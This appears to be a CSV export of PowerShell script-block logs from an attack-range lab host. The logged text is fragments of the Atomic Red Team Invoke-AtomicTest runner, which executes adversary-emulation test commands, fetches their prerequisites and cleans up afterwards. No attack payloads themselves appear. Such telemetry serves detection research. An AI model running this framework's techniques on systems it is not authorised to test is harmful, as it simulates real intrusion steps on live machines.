                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {
                            Write-Verbose -Message ""Unable to run non-$executionPlatform tests""
                            continue
                        }

                        if ( $executionPlatform -eq ""windows"" -and ($test.executor.name -eq ""sh"" -or $test.executor.name -eq ""bash"")) {
                            Write-Verbose -Message ""Unable to run sh or bash on $executionPlatform""
                            continue
                        }
                        if ( (""linux"", ""macos"") -contains $executionPlatform -and $test.executor.name -eq ""command_prompt"") {
                            Write-Verbose -Message ""Unable to run cmd.exe on $executionPlatform""
                            continue
                        }
                    }


                    if ($null -ne $TestNumbers) {
                        if (-Not ($TestNumbers -contains $testCount) ) { continue }
                    }

                    if ($null -ne $TestNames) {
                        if (-Not ($TestNames -contains $test.name) ) { continue }
                    }

                    if ($null -ne $TestGuids) {
                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }
                    }

                    $props = @{
                        Activity        = 'Running Atomic Tests'
                        Status          = 'Progress:'
                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)
                    }
                    Write-Progress @props

                    Write-Verbose -Message 'Determining manual tests'

                    if ($test.executor.name.Contains('manual')) {
                        Write-Verbose -Message 'Unable to run manual tests'
                        continue
                    }
                    $numAtomicsApplicableToPlatform++

                    $testId = ""$AT-$testCount $($test.name)""
                    if ($ShowDetailsBrief) {
                        Write-KeyValue $testId
                        continue
                    }

                    if ($PromptForInputArgs) {
                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments
                    }

                    if ($ShowDetails) {
                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads
                        continue
                    }

                    Write-Debug -Message 'Gathering final Atomic test command'


                    if ($CheckPrereqs) {
                        Write-KeyValue ""CheckPrereq's for: "" $testId
                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session
                        Write-PrereqResults $FailureReasons $testId
                    }
                    elseif ($GetPrereqs) {
                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Build-TFVars $AT $testCount $InputArgs
                        }
                        Write-KeyValue ""GetPrereq's for: "" $testId
                        if ( $test.executor.elevation_required -and -not $isElevated) {
                            Write-Host -ForegroundColor Red ""Elevation required but not provided""
                        }
                        if ($nul -eq $test.dependencies) { Write-KeyValue ""No Preqs Defined""; continue }
                        foreach ($dep in $test.dependencies) {
                            $executor = Get-PrereqExecutor $test
                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()
                            Write-KeyValue  ""Attempting to satisfy prereq: "" $description
                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads
                            if ($executor -ne ""powershell"") { $final_command_prereq = ($final_command_prereq.trim()).Replace(""`n"", "" && "") }
                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $PathToPayloads
                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true

                            if ($res.ExitCode -eq 0) {
                                Write-KeyValue ""Prereq already met: "" $description
                            }
                            else {
                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true
                                if ($res.ExitCode -eq 0) {
                                    Write-KeyValue ""Prereq successfully met: "" $description
                                }
                                else {
                                    Write-Host -ForegroundColor Red ""Failed to meet prereq: $description""
                                }
                            }
                        }
                    }
                    elseif ($Cleanup) {
                        Write-KeyValue ""Executing cleanup for test: "" $testId
                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-KeyValue ""Done executing cleanup for test: "" $testId
                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }
                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Remove-TerraformFiles $AT $testCount
                        }
                    }
                    else {
                        Write-KeyValue ""Executing test: "" $testId
                        $startTime = Get-Date
                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-Host ""Exit code: $($res.ExitCode)""
                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }
                        $stopTime = Get-Date
                        if ($isLoggingModuleSet) {
                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                                &""$_\Write-ExecutionLog"" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))
                            }
                        }
                        Write-KeyValue ""Done executing test: "" $testId
                    }

                } # End of foreach Test in single Atomic Technique
            } # End of foreach Technique in Atomic Tests
            if ($numAtomicsApplicableToPlatform -eq 0) {
                Write-Host -ForegroundColor Yellow ""Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString""
            }
        } # End of Invoke-AtomicTestSingle function

        if ($AtomicTechnique -eq ""All"") {
            function Invoke-AllTests() {
                $AllAtomicTests = New-Object System.Collections.ArrayList
                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {
                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)
                    if ( $currentTechnique -match ""T[0-9]{4}.?([0-9]{3})?"" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }
                }
                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }
            }

            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',
                    ""Highway to the danger zone, Executing All Atomic Tests!"" ) ) {
                Invoke-AllTests
            }
        }
        else {
            Invoke-AtomicTestSingle $AtomicTechnique
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Stop-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))
            }
        }

    } # End of PROCESS block
    END { } # Intentionally left blank and can be removed
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","2",""
"12/16/2024 8:34:56 PM","35710870","1",", Get","Get [Score: 1]","3689","'elevation_required')) {
                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.""
                    return
                }

                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']
            }
            else {
                # if elevation_required is not present, default to false
                $ExecutorInstance.elevation_required = $False
            }

            $InputArgumentNames = $null

            # Get all input argument names
            $InputArgumentNames = $InputArguments.Keys

            # Extract all input arguments names from the executor
            # Potential places where input arguments can be populated:
            #  - Dependency description
            #  - Dependency prereq_command
            #  - Dependency get_prereq_command
            #  - Executor steps
            #  - Executor command
            #  - Executor cleanup_command

            $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
            ForEach-Object { $Regex.Matches($_) } |
            Select-Object -ExpandProperty Groups |
            Where-Object { $_.Name -eq 'ArgName' } |
            Select-Object -ExpandProperty Value |
            Sort-Object -Unique


            # Validate that all executor input arg names are defined input arg names.
            if ($InputArgumentNamesFromExecutor.Count) {
                $InputArgumentNamesFromExecutor | ForEach-Object {
                    if ($InputArgumentNames -notcontains $_) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'""
                        return
                    }
                }
            }

            # Validate that all defined input args are utilized at least once in the executor.
            if ($InputArgumentNames.Count) {
                $InputArgumentNames | ForEach-Object {
                    if ($InputArgumentNamesFromExecutor -notcontains $_) {
                        # Write a warning since this scenario is not considered a breaking change
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.""
                    }
                }
            }

            $ExecutorInstance.name = $AtomicTest['executor']['name']

            $AtomicTestInstance.executor = $ExecutorInstance

            $AtomicTests[$i] = $AtomicTestInstance
        }

        $AtomicInstance.atomic_tests = $AtomicTests

        $AtomicInstance
    }
}


# Tab completion for Atomic Tests
function Get-TechniqueNumbers {
    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }
    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |
    ForEach-Object { $_.BaseName }

    return $techniqueNumbers
}

Register-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {
    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)

    Get-TechniqueNumbers | Where-Object { $_ -like ""$wordToComplete*"" } |
    ForEach-Object {
        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', ""Technique number $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","2",""
"12/16/2024 8:34:56 PM","35710924","1",", Get","Get [Score: 1]","1945","function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {
    $defaultArgs = @{ }
    foreach ($key in $ip.Keys) {
        $defaultArgs[$key] = $ip[$key].default
    }
    # overwrite defaults with any user supplied values
    foreach ($key in $customInputArgs.Keys) {
        if ($defaultArgs.Keys -contains $key) {
            # replace default with user supplied
            $defaultArgs.set_Item($key, $customInputArgs[$key])
        }
        else {
            Write-Verbose ""The specified input argument *$key* was ignored as not applicable""
        }
    }
    $defaultArgs
}

function Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {
    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {
        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'
        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder

        foreach ($key in $inputArgs.Keys) {
            $findValue = '#{' + $key + '}'
            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])
        }
    }

    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value
    $finalCommand = ($finalCommand -replace ""\`$PathToAtomicsFolder"", $PathToAtomicsFolder) -replace ""PathToAtomicsFolder"", $PathToAtomicsFolder

    $finalCommand
}

function Invoke-PromptForInputArgs([hashtable]$ip) {
    $InputArgs = @{ }
    foreach ($key in $ip.Keys) {
        $InputArgs[$key] = $ip[$key].default
        $newValue = Read-Host -Prompt ""Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]""
        # replace default with user supplied
        if (-not [string]::IsNullOrWhiteSpace($newValue)) {
            $InputArgs.set_Item($key, $newValue)
        }
    }
    $InputArgs
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710701","1",", Get","Get [Score: 1]","426","function Invoke-KillProcessTree {
    Param([int]$ppid)
    if ($IsLinux -or $IsMacOS) {
        sh -c ""pkill -9 -P $ppid""
    }
    else {
        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {
            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }
        }
        Stop-Process -Id $ppid -ErrorAction Ignore
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710915","1",", Get","Get [Score: 1]","1000","function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {
    $FailureReasons = New-Object System.Collections.ArrayList
    if ( $test.executor.elevation_required -and -not $isElevated) {
        $FailureReasons.add(""Elevation required but not provided`n"") | Out-Null
    }
    foreach ($dep in $test.dependencies) {
        $executor = Get-PrereqExecutor $test
        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
        if ($executor -ne ""powershell"") { $final_command = ($final_Command.trim()).Replace(""`n"", "" && "") }
        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session
        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
        if ($res.ExitCode -ne 0) {
            $FailureReasons.add($description) | Out-Null
        }
    }
    $FailureReasons
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710909","1",", Get","Get [Score: 1]","195","function Get-PrereqExecutor ($test) {
    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }
    else { $executor = $test.dependency_executor_name }
    $executor
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710892","1",", Get","Get [Score: 1]","426","function Invoke-KillProcessTree {
    Param([int]$ppid)
    if ($IsLinux -or $IsMacOS) {
        sh -c ""pkill -9 -P $ppid""
    }
    else {
        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {
            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }
        }
        Stop-Process -Id $ppid -ErrorAction Ignore
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710691","1",", Get","Get [Score: 1]","12161","function Invoke-AtomicTest {
    [CmdletBinding(DefaultParameterSetName = 'technique',
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $true,
            Position = 0,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AtomicTechnique,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $anyOS,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNumbers,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNames,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestGuids,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }),

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $CheckPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $PromptForInputArgs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $GetPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Cleanup = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $NoExecutionLog = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { ""/tmp/Invoke-AtomicTest-ExecutionLog.csv"" } else { ""$env:TEMP\Invoke-AtomicTest-ExecutionLog.csv"" }),

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $Force,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [HashTable]
        $InputArgs,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [Int]
        $TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]
        [System.Management.Automation.Runspaces.PSSession[]]$Session,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Interactive = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $KeepStdOutStdErrFiles = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $SupressPathToAtomicsFolder = $false

    )
    BEGIN { } # Intentionally left blank and can be removed
    PROCESS {
        function ConvertTo-LoggerArray {
            param (
                [Parameter(Mandatory = $true)]
                [string]$Loggers
            )

            return $Loggers -split ',' | ForEach-Object { $_.Trim() }
        }

        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path

        Write-Verbose -Message 'Attempting to run Atomic Techniques'
        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan ""PathToAtomicsFolder = $PathToAtomicsFolder`n"" }

        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session
        $PathToPayloads = if ($Session) { ""$tmpDir`AtomicRedTeam"" }  else { $PathToAtomicsFolder }

        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.
        # So converting it back to string.
        if ($AtomicTechnique -is [array]) {
            $AtomicTechnique = $AtomicTechnique -join "",""
        }

        # Splitting Atomic Technique short form into technique and test numbers.
        $AtomicTechniqueParams = ($AtomicTechnique -split '-')
        $AtomicTechnique = $AtomicTechniqueParams[0]

        if ($AtomicTechniqueParams.Length -gt 1) {
            $ShortTestNumbers = $AtomicTechniqueParams[-1]
        }

        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {
            $TestNumbers = $ShortTestNumbers -split ','
        }

        $isLoggingModuleSet = $false
        if (-not $NoExecutionLog) {
            $isLoggingModuleSet = $true
            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {
                # no logging module explicitly set
                # syslog logger
                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort
                if ( $artConfig.LoggingModule -eq ""Syslog-ExecutionLogger"" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {
                    if ($syslogOptionsSet) {
                        $LoggingModule = ""Syslog-ExecutionLogger""
                    }
                    else {
                        Write-Host -Fore Yellow ""Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead""
                        $LoggingModule = ""Default-ExecutionLogger""
                    }
                }
                elseif (-not [bool]$artConfig.LoggingModule) {
                    # loggingModule is blank (not set), so use the default logger
                    $LoggingModule = ""Default-ExecutionLogger""
                }
                else {
                    $LoggingModule = $artConfig.LoggingModule
                }
            }
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                if (Get-Module -name $_) {
                    Write-Verbose ""Using Logger: $_""
                }
                else {
                    Write-Host -Fore Yellow ""Logger not found: "", $_
                }

                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger
                if ($_ -eq ""Attire-ExecutionLogger"") { $ExecutionLogPath = $ExecutionLogPath.Replace(""Invoke-AtomicTest-ExecutionLog.csv"", ""Invoke-AtomicTest-ExecutionLog-timestamp.json"") }
                $ExecutionLogPath = $ExecutionLogPath.Replace(""timestamp"", $(Get-Date -UFormat %s))

                if (Get-Command ""$_\Start-ExecutionLog"" -erroraction silentlycontinue) {
                    if (Get-Command ""$_\Write-ExecutionLog"" -erroraction silentlycontinue) {
                        if (Get-Command ""$_\Stop-ExecutionLog"" -erroraction silentlycontinue) {
                            Write-Verbose ""All logging commands found""
                        }
                        else {
                            Write-Host ""Stop-ExecutionLog not found or loaded from the wrong module""
                            return
                        }
                    }
                    else {
                        Write-Host ""Write-ExecutionLog not found or loaded from the wrong module""
                        return
                    }
                }
                else {
                    Write-Host ""Start-ExecutionLog not found or loaded from the wrong module""
                    return
                }
            }

            # Here we're rebuilding an equivalent command line to put in the logs
            $commandLine = ""Invoke-AtomicTest $AtomicTechnique""

            if ($ShowDetails -ne $false) {
                $commandLine = ""$commandLine -ShowDetails $ShowDetails""
            }

            if ($ShowDetailsBrief -ne $false) {
                $commandLine = ""$commandLine -ShowDetailsBrief $ShowDetailsBrief""
            }

            if ($null -ne $TestNumbers) {
                $commandLine = ""$commandLine -TestNumbers $TestNumbers""
            }

            if ($null -ne $TestNames) {
                $commandLine = ""$commandLine -TestNames $TestNames""
            }

            if ($null -ne $TestGuids) {
                $commandLine = ""$commandLine -TestGuids $TestGuids""
            }

            $commandLine = ""$commandLine -PathToAtomicsFolder $PathToAtomicsFolder""

            if ($CheckPrereqs -ne $false) {
                $commandLine = ""$commandLine -CheckPrereqs $CheckPrereqs""
            }

            if ($PromptForInputArgs -ne $false) {
                $commandLine = ""$commandLine -PromptForInputArgs $PromptForInputArgs""
            }

            if ($GetPrereqs -ne $false) {
                $commandLine = ""$commandLine -GetPrereqs $GetPrereqs""
            }

            if ($Cleanup -ne $false) {
                $commandLine = ""$commandLine -Cleanup $Cleanup""
            }

            if ($NoExecutionLog -ne $false) {
                $commandLine = ""$commandLine -NoExecutionLog $NoExecutionLog""
            }

            $commandLine = ""$commandLine -ExecutionLogPath $ExecutionLogPath""

            if ($Force -ne $false) {
                $commandLine = ""$commandLine -Force $Force""
            }

            if ($InputArgs -ne $null) {
                $commandLine = ""$commandLine -InputArgs $InputArgs""
            }

            $commandLine = ""$commandLine -TimeoutSeconds $TimeoutSeconds""
            if ($PSBoundParameters.ContainsKey('Session')) {
                if ( $null -eq $Session ) {
                    Write-Error ""The provided session is null and cannot be used.""
                    continue
                }
                else {
                    $commandLine = ""$commandLine -Session $Session""
                }
            }

            if ($Interactive -ne $false) {
                $commandLine = ""$commandLine -Interactive $Interactive""
            }

            if ($KeepStdOutStdErrFiles -ne $false) {
                $commandLine = ""$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles""
            }

            if ($null -ne $LoggingModule) {
                $commandLine = ""$commandLine -LoggingModule $LoggingModule""
            }

            $startTime = Get-Date
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Start-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))
            }
        }

        function Platform-IncludesCloud {
            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.supported_platforms) {
                if ($cloud -contains $platform) {
                    return $true
                }
            }
            return $false
        }

        function Test-IncludesTerraform($AT, $testCount) {
            $AT = $AT.ToUpper()
            $pathToTerraform = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount\$AT-$testCount.tf""
            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.support","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","2",""
"12/16/2024 8:34:55 PM","35710718","1",", Get","Get [Score: 1]","195","function Get-PrereqExecutor ($test) {
    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }
    else { $executor = $test.dependency_executor_name }
    $executor
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710883","1",", Get","Get [Score: 1]","10875","e ($AT) {

            $AT = $AT.ToUpper()
            $pathToYaml = Join-Path $PathToAtomicsFolder ""\$AT\$AT.yaml""
            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }
            else {
                Write-Host -Fore Red ""ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter""
                return
            }
            $techniqueCount = 0
            $numAtomicsApplicableToPlatform = 0
            $techniqueString = """"
            foreach ($technique in $AtomicTechniqueHash) {
                $techniqueString = $technique.attack_technique[0]
                $techniqueCount++

                $props = @{
                    Activity        = ""Running $($technique.display_name.ToString()) Technique""
                    Status          = 'Progress:'
                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)
                }
                Write-Progress @props

                Write-Debug -Message ""Gathering tests for Technique $technique""

                $testCount = 0
                foreach ($test in $technique.atomic_tests) {

                    Write-Verbose -Message 'Determining tests for target platform'

                    $testCount++

                    if (-not $anyOS) {
                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {
                            Write-Verbose -Message ""Unable to run non-$executionPlatform tests""
                            continue
                        }

                        if ( $executionPlatform -eq ""windows"" -and ($test.executor.name -eq ""sh"" -or $test.executor.name -eq ""bash"")) {
                            Write-Verbose -Message ""Unable to run sh or bash on $executionPlatform""
                            continue
                        }
                        if ( (""linux"", ""macos"") -contains $executionPlatform -and $test.executor.name -eq ""command_prompt"") {
                            Write-Verbose -Message ""Unable to run cmd.exe on $executionPlatform""
                            continue
                        }
                    }


                    if ($null -ne $TestNumbers) {
                        if (-Not ($TestNumbers -contains $testCount) ) { continue }
                    }

                    if ($null -ne $TestNames) {
                        if (-Not ($TestNames -contains $test.name) ) { continue }
                    }

                    if ($null -ne $TestGuids) {
                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }
                    }

                    $props = @{
                        Activity        = 'Running Atomic Tests'
                        Status          = 'Progress:'
                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)
                    }
                    Write-Progress @props

                    Write-Verbose -Message 'Determining manual tests'

                    if ($test.executor.name.Contains('manual')) {
                        Write-Verbose -Message 'Unable to run manual tests'
                        continue
                    }
                    $numAtomicsApplicableToPlatform++

                    $testId = ""$AT-$testCount $($test.name)""
                    if ($ShowDetailsBrief) {
                        Write-KeyValue $testId
                        continue
                    }

                    if ($PromptForInputArgs) {
                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments
                    }

                    if ($ShowDetails) {
                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads
                        continue
                    }

                    Write-Debug -Message 'Gathering final Atomic test command'


                    if ($CheckPrereqs) {
                        Write-KeyValue ""CheckPrereq's for: "" $testId
                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session
                        Write-PrereqResults $FailureReasons $testId
                    }
                    elseif ($GetPrereqs) {
                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Build-TFVars $AT $testCount $InputArgs
                        }
                        Write-KeyValue ""GetPrereq's for: "" $testId
                        if ( $test.executor.elevation_required -and -not $isElevated) {
                            Write-Host -ForegroundColor Red ""Elevation required but not provided""
                        }
                        if ($nul -eq $test.dependencies) { Write-KeyValue ""No Preqs Defined""; continue }
                        foreach ($dep in $test.dependencies) {
                            $executor = Get-PrereqExecutor $test
                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()
                            Write-KeyValue  ""Attempting to satisfy prereq: "" $description
                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads
                            if ($executor -ne ""powershell"") { $final_command_prereq = ($final_command_prereq.trim()).Replace(""`n"", "" && "") }
                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $PathToPayloads
                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true

                            if ($res.ExitCode -eq 0) {
                                Write-KeyValue ""Prereq already met: "" $description
                            }
                            else {
                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true
                                if ($res.ExitCode -eq 0) {
                                    Write-KeyValue ""Prereq successfully met: "" $description
                                }
                                else {
                                    Write-Host -ForegroundColor Red ""Failed to meet prereq: $description""
                                }
                            }
                        }
                    }
                    elseif ($Cleanup) {
                        Write-KeyValue ""Executing cleanup for test: "" $testId
                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-KeyValue ""Done executing cleanup for test: "" $testId
                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }
